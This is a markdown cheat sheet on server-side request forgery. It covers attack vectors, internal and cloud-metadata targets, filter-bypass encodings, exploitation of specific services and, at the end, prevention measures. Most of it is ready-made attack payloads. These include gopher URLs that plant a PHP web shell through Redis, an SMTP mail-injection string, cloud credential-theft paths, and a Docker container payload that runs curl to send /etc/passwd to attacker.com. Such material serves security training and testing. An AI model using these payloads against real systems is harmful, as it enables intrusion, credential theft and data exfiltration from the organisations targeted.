## Server-side Request Forgery (SSRF)

- **What it is**
  - A web security vulnerability that allows attackers to induce server-side applications to make HTTP requests to arbitrary domains
  - Exploits the trust relationship between the server and other systems (internal or external)
  - Forces the vulnerable server to act as a proxy for reaching otherwise inaccessible services
  - Enables attackers to bypass security controls like firewalls and network ACLs
  - Can lead to information disclosure, authentication bypass, and in some cases remote code execution

- **Impact of SSRF vulnerabilities**
  - Access to internal services not directly exposed to the internet
  - Retrieval of sensitive data from internal systems
  - Exploitation of trust relationships between services
  - Ability to scan internal networks from the server's perspective
  - Potential for remote code execution if vulnerable services are accessed
  - Potential for chaining with other vulnerabilities (XSS, XXE, etc.)
  - Possible exposure of cloud metadata services leading to credential theft
  - Acting as an anonymizing proxy for further attacks

- **Common SSRF attack vectors**

  - **URLs in request parameters**
    - API endpoints that fetch external resources
    - Document/image import features
    - PDF generators
    - Webhook configurations
    - URL previews/link unfurlers
    - Example:
      ```
      GET /fetch?url=https://example.com/resource HTTP/1.1
      ```
    - Attack:
      ```
      GET /fetch?url=http://internal-service/admin HTTP/1.1
      ```

  - **URLs in request bodies**
    - JSON/XML APIs containing URL fields
    - File upload metadata
    - Example:
      ```
      POST /api/import HTTP/1.1
      Content-Type: application/json

      {"source":"https://example.com/data.json"}
      ```
    - Attack:
      ```
      POST /api/import HTTP/1.1
      Content-Type: application/json

      {"source":"http://internal-network.local/sensitive-data"}
      ```

  - **URLs in headers**
    - Referer header processing
    - Custom headers used for integrations
    - X-Forwarded-For and similar headers
    - Example:
      ```
      GET /analytics HTTP/1.1
      Referer: https://evil.com?ssrf=http://internal-service/
      ```

  - **File upload features**
    - SVG images (contain XML with potential external entities)
    - HTML files with external resources
    - Office documents with external references
    - Example (SVG with SSRF):
      ```xml
      <svg xmlns="http://www.w3.org/2000/svg">
        <image href="http://internal-service/admin" />
      </svg>
      ```

- **SSRF attack targets**

  - **Against the server itself (localhost)**
    - Administrative interfaces on localhost
      - Common paths: `/admin`, `/management`, `/console`, `/internal`
      - Example: `http://127.0.0.1:8080/admin`
    - Development/debugging endpoints
      - Spring Boot Actuator: `http://localhost:8080/actuator`
      - Express.js debug: `http://localhost:8080/debug`
    - Alternative localhost references:
      - `http://127.0.0.1/admin`
      - `http://localhost/admin`
      - `http://[::1]/admin` (IPv6)
      - `http://0.0.0.0/admin`
      - `http://0/admin`

  - **Against internal network services**
    - Internal web applications
      - Private admin panels: `http://192.168.1.1/admin`
      - Intranet services: `http://intranet.company.local`
    - Network infrastructure
      - Routers/switches: `http://192.168.1.1/`
      - Printers: `http://192.168.1.10:631`
      - Network monitoring: `http://monitoring.internal:8080`
    - Databases and storage
      - Redis: `http://redis-server:6379`
      - MongoDB: `http://mongodb-server:27017`
      - Elasticsearch: `http://elastic-server:9200/_cat/indices`
      - Memcached: `http://memcached-server:11211/stats`
    - Service discovery systems
      - Consul: `http://consul:8500/v1/catalog/services`
      - Eureka: `http://eureka:8761/eureka/apps`
      - Kubernetes API: `https://kubernetes.default.svc`

  - **Against cloud metadata services**
    - AWS metadata service
      - Basic access: `http://169.254.169.254/latest/meta-data/`
      - IAM credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
      - User data: `http://169.254.169.254/latest/user-data/`
      - IMDSv2 (requires token): 
        ```
        # First request to get token
        GET http://169.254.169.254/latest/api/token
        X-aws-ec2-metadata-token-ttl-seconds: 21600

        # Then use token for metadata access
        GET http://169.254.169.254/latest/meta-data/
        X-aws-ec2-metadata-token: TOKEN_VALUE
        ```
    - Azure metadata service
      - Basic access: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
      - With required header: `Metadata: true`
    - Google Cloud metadata service
      - Basic access: `http://metadata.google.internal/computeMetadata/v1/`
      - With required header: `Metadata-Flavor: Google`
    - DigitalOcean metadata service
      - Basic access: `http://169.254.169.254/metadata/v1/`
    - Other cloud providers have similar endpoints

  - **Against external services**
    - Third-party APIs
    - Website content
    - Public services that might trust the server's IP

- **SSRF detection techniques**

  - **Testing for regular SSRF**
    - Replace URLs in request parameters with localhost or internal IPs
    - Check if response contains content from the internal service
    - Look for changes in response timing
    - Test for error messages revealing connection attempts

  - **Testing for blind SSRF**
    - Use an external server you control (like Burp Collaborator)
    - Replace URLs with your server URL and monitor for incoming connections
    - Example: `http://YOUR-COLLABORATOR-ID.burpcollaborator.net`
    - Look for DNS lookups and HTTP requests
    - Use unique subdomains per test to track where connections come from
    - Add time delays using services that take time to respond
    - Example: `http://10.0.0.1:11211` (checking if Memcached port is open via response timing)

  - **Testing SSRF via redirects**
    - Set up an open redirect on a domain you control
    - Point the application to your domain, which redirects to internal targets
    - Example: `https://your-server.com/redirect?url=http://internal-service/`

- **Bypassing common SSRF defenses**

  - **Bypassing blacklist-based filters**
    
    - **Alternative IP representations**
      - **Decimal IP conversion**
        - Convert 127.0.0.1 to decimal: 2130706433
        - Example: `http://2130706433/admin`
      - **Octal format**
        - Convert 127.0.0.1 to octal: 017700000001
        - Example: `http://017700000001/admin`
      - **Hexadecimal format**
        - Convert 127.0.0.1 to hex: 0x7f000001
        - Example: `http://0x7f000001/admin`
      - **Mixed encoding**
        - Example: `http://127.0.0.0x1/admin`
        - Example: `http://0177.0.0.1/admin`
      - **IPv6 encoding**
        - Localhost in IPv6: ::1
        - Example: `http://[::1]/admin`
        - Example: `http://[0:0:0:0:0:0:0:1]/admin`
      - **IPv6/IPv4 mixed encoding**
        - Example: `http://[::ffff:127.0.0.1]/admin`
        - Example: `http://[::ffff:7f00:1]/admin`
    
    - **DNS tricks**
      - **Domain -> localhost resolution**
        - Register/use domains that resolve to 127.0.0.1
        - Example: `http://localtest.me/admin` (resolves to 127.0.0.1)
        - Example: `http://customer1.app.localhost.my.company.127.0.0.1.nip.io`
        - Example: `http://spoofed.burpcollaborator.net` (if set to resolve to 127.0.0.1)
      - **DNS rebinding attacks**
        - Configure a DNS server to respond differently on sequential requests
        - First request: returns a safe IP that passes security checks
        - Subsequent requests: returns an internal IP
        - Tools: Singularity, whonow, rbndr.us
        - Example: `http://attacker-controlled-domain.com` (initially resolves to safe IP, then to 127.0.0.1)
    
    - **URL encoding tricks**
      - **Single encoding**
        - Encode characters to bypass simple string matching
        - Example: `http://127.0.0.1` -> `http://127%2E0%2E0%2E1`
        - Example: `http://localhost` -> `http://lo%63alhost`
      - **Double encoding**
        - Apply URL encoding twice
        - Example: `http://127.0.0.1` -> `http://127%252E0%252E0%252E1`
      - **Mixed case encoding**
        - Example: `http://LoCaLhOsT/admin`
        - Example: `http://127.0.0.1` -> `http://127%2e0%2E0%2e1`
    
    - **Using URL fragments**
      - Add an allowed domain as a fragment
      - Example: `http://127.0.0.1#example.com`
      - Example: `http://127.0.0.1#.example.com`
    
    - **Path normalization**
      - Add directory traversal sequences
      - Example: `http://allowed-domain.com/../../etc/passwd`
      - Example: `http://allowed-domain@127.0.0.1`
      - Example: `http://allowed-domain.com/redirect?url=http://127.0.0.1/admin`
    
    - **Protocol-based bypasses**
      - Use alternative protocols
      - Example: `https://127.0.0.1/admin`
      - Example: `ftp://127.0.0.1/`
      - Example: `gopher://127.0.0.1:25/` (for SMTP interaction)
      - Example: `file:///etc/passwd`
      - Example: `dict://internal-server:11211/stat` (for Memcached)
    
    - **Non-standard ports**
      - Target services on non-standard ports
      - Example: `http://127.0.0.1:8080/admin`
      - Example: `http://127.0.0.1:3306/` (MySQL)
      - Example: `http://127.0.0.1:22/` (SSH - timing attack)

  - **Bypassing whitelist-based filters**
    
    - **Subdomain-based bypasses**
      - Create subdomains of your domain that include the whitelisted domain
      - Example: `http://whitelisted-domain.com.attacker.com`
    
    - **Using credentials in URLs**
      - Example: `http://username@127.0.0.1` (where username is a whitelisted domain)
      - Example: `http://whitelisted-domain.com@127.0.0.1`
    
    - **URL parsing inconsistencies**
      - Example: `http://whitelisted-domain.com%252F@127.0.0.1`
      - Example: `http://whitelisted-domain.com%2523@127.0.0.1`
      - Example: `http://whitelisted-domain.com:@127.0.0.1`
      - Example: `http://127.0.0.1?whitelisted-domain.com`
      - Example: `http://127.0.0.1/folder/file.ext#whitelisted-domain.com`
    
    - **Exploiting parser logic**
      - Add extra `@` symbols
      - Example: `http://whitelisted-domain.com@@127.0.0.1`
      - Add backslashes
      - Example: `http://whitelisted-domain.com\\@127.0.0.1`
      - Mixed URL encoding
      - Example: `http://whitelisted-domain.com%25253F@127.0.0.1`
    
    - **Abusing redirects**
      - Use a domain that redirects to internal services
      - Example: `http://whitelisted-domain.com` (which redirects to 127.0.0.1)

  - **Bypassing SSRF via open redirects**
    
    - **Finding and exploiting open redirects**
      - Look for redirect parameters in whitelisted applications
      - Example parameters: `?url=`, `?redirect=`, `?next=`, `?return=`, `?returnTo=`, `?go=`
      - Example: `http://allowed-app.com/redirect?url=http://internal-app/admin`
    
    - **Redirect status code variation**
      - Try different redirect status codes (301, 302, 303, 307, 308)
      - Some applications may handle different codes in various ways
    
    - **Using meta refresh redirects**
      - If the application returns HTML, try meta refresh redirects
      - Example: `<meta http-equiv="refresh" content="0;url=http://internal-service/admin">`

  - **Bypassing content type validation**
    
    - **Content type spoofing**
      - Some SSRF defenses only check if the response is "safe" (e.g., image type)
      - Set up a server that returns valid image headers but contains sensitive data
      - Example: Return a PNG file with IDAT chunks containing stolen data
    
    - **Exploiting timeouts**
      - If validation includes content type checking with timeouts
      - Make your malicious server respond slowly, potentially bypassing full validation

- **Advanced SSRF exploitation techniques**

  - **Port scanning via SSRF**
    - Use timing differences to determine open ports
    - Example: `http://127.0.0.1:80/` vs `http://127.0.0.1:22/`
    - Open ports typically respond faster than closed ones
    - Script to test multiple ports and record response times
    
  - **Extracting responses from blind SSRF**
    - **Using out-of-band channels**
      - DNS exfiltration
      - Example: `http://internal-service/sensitive-data?callback=http://YOUR-DOMAIN.com/`
      - The callback parameter may include the response in the URL
    - **Error-based extraction**
      - If errors include response snippets
      - Craft requests that cause errors containing the data you want
    - **Time-based extraction**
      - Use sleep functions or slow endpoints to extract data bit by bit
      - Example: `http://internal-api/endpoint?param=test${if:substr(secret,1,1)=a:sleep(10)}`
    
  - **Exploiting specific services via SSRF**
    
    - **Redis exploitation**
      - Using GOPHER protocol: `gopher://127.0.0.1:6379/_SET%20ssrf_test%20%22hello%22`
      - Common commands:
        ```
        gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
        gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php
        gopher://127.0.0.1:6379/_SET%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22
        gopher://127.0.0.1:6379/_SAVE
        ```
    
    - **Memcached exploitation**
      - Read data: `gopher://127.0.0.1:11211/_%0astats%0astats%20items%0astats%20cachedump%201%20100%0aget%20key_name%0aquit`
      - Set data: `gopher://127.0.0.1:11211/_%0aset%20ssrf_test%200%2060%205%0aabcde%0aquit`
    
    - **SMTP exploitation**
      - Send email: 
        ```
        gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM%3A%3Cattacker%40example.com%3E%0ARCPT%20TO%3A%3Cvictim%40example.com%3E%0ADATA%0AFrom%3A%20%5BHacked%5D%20%3Csystem%40example.com%3E%0ATo%3A%20%3Cvictim%40example.com%3E%0ADate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%0ASubject%3A%20SSRF%20Email%20Test%0A%0AThis%20email%20was%20sent%20using%20SSRF%0A%0A%0A.%0AQUIT
        ```
    
    - **Exploiting AWS metadata service**
      - Fetch IAM credentials:
        ```
        http://169.254.169.254/latest/meta-data/iam/security-credentials/
        http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
        ```
      - Using obtained credentials to access AWS resources
    
    - **Exploiting Kubernetes API server**
      - Access secrets: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
      - Create pod: `POST https://kubernetes.default.svc/api/v1/namespaces/default/pods`
    
    - **Exploiting Docker API**
      - List containers: `http://localhost:2375/containers/json`
      - Create container: `POST http://localhost:2375/containers/create`
      - Example of RCE via container creation:
        ```
        POST http://localhost:2375/containers/create HTTP/1.1
        Content-Type: application/json

        {
          "Image":"alpine",
          "Cmd":["/bin/sh", "-c", "curl -X POST -d \"$(cat /etc/passwd)\" https://attacker.com"],
          "HostConfig":{
            "Binds": ["/:/hostfs"]
          }
        }
        ```

  - **Chaining SSRF with other vulnerabilities**
    
    - **SSRF + XXE**
      - Use XXE to trigger SSRF requests
      - Example:
        ```xml
        <!DOCTYPE data [
          <!ENTITY xxe SYSTEM "http://internal-service/admin">
        ]>
        <data>&xxe;</data>
        ```
    
    - **SSRF + CSRF**
      - Use SSRF to bypass same-origin policy and forge requests to internal services
      - Example: Host a page that triggers SSRF, then use the server as a proxy to attack internal services
    
    - **SSRF + RCE**
      - Leverage SSRF to access services that might allow command execution
      - Example: Access Jenkins script console, Kubernetes API, or similar management services
    
    - **SSRF + Deserialization**
      - Use SSRF to trigger deserialization endpoints
      - Example: Access JBoss JMXInvokerServlet or similar endpoints that accept serialized data

  - **Multi-stage SSRF attacks**
    - Use initial SSRF to discover internal services
    - Then target specific services with crafted payloads
    - Map internal network topology through SSRF scanning
    - Chain multiple vulnerabilities for deeper access

- **SSRF in cloud environments**

  - **AWS-specific techniques**
    - **Using IMDS to access credentials**
      - Path: `/latest/meta-data/iam/security-credentials/[ROLE_NAME]`
      - Returns temporary access credentials for the instance role
    - **Accessing user data**
      - Path: `/latest/user-data`
      - May contain bootstrap scripts with secrets
    - **Instance identity documents**
      - Path: `/latest/dynamic/instance-identity/document`
      - Contains instance details that might be useful for further attacks
    - **Bypassing IMDSv2 protection**
      - IMDSv2 requires a token: `X-aws-ec2-metadata-token`
      - Try other IP addresses: `fd00:ec2::254`
      - Try legacy endpoint: `http://100.100.100.200`

  - **GCP-specific techniques**
    - **Accessing service account tokens**
      - Path: `/computeMetadata/v1/instance/service-accounts/default/token`
      - Required header: `Metadata-Flavor: Google`
    - **Getting service account information**
      - Path: `/computeMetadata/v1/instance/service-accounts/`
      - Path: `/computeMetadata/v1/instance/service-accounts/default/email`
    - **Accessing project attributes**
      - Path: `/computeMetadata/v1/project/`
      - Path: `/computeMetadata/v1/project/attributes/`

  - **Azure-specific techniques**
    - **Accessing MSI tokens**
      - Path: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`
      - Required header: `Metadata: true`
    - **Instance information**
      - Path: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

  - **Container-based environments**
    - **Docker socket exploitation**
      - Path: `http://localhost:2375/containers/json`
      - Path: `http://localhost:2375/images/json`
    - **Kubernetes API**
      - Path: `https://kubernetes.default.svc`
      - Service account tokens typically at: `/var/run/secrets/kubernetes.io/serviceaccount/token`

- **Prevention and mitigation**

  - **Input validation**
    - Validate and sanitize all URL parameters
    - Implement strict allowlist-based validation of domains/IPs
    - Use proper URL parsing libraries rather than regex for validation
  
  - **Network-level protections**
    - Implement proper network segmentation
    - Use firewall rules to restrict server-to-server communications
    - Run application servers with minimal network privileges
    - Deploy applications in isolated VPC/network environments
    - Use private VPC endpoints for cloud services
  
  - **Design-level mitigations**
    - Use a dedicated service/server for external resource fetching
    - Implement URL signing for trusted URLs
    - Use pre-defined resource lists instead of accepting arbitrary URLs
    - Avoid protocols like gopher:// and file:// if not necessary
  
  - **Cloud-specific protections**
    - Use IMDSv2 on AWS (requires token header)
    - Apply proper IAM roles with minimal privileges
    - Disable metadata service if not needed
    - Use network policies to restrict access to metadata services
  
  - **Response handling**
    - Don't return raw responses from fetched URLs
    - Filter and sanitize data before returning to users
    - Implement timeouts for all external requests
    - Hide error details that might reveal internal network information

  - **Monitoring and detection**
    - Monitor outbound connections from application servers
    - Implement anomaly detection for unusual internal network requests
    - Set up alerts for access attempts to sensitive internal services
    - Keep logs of all URL fetching operations
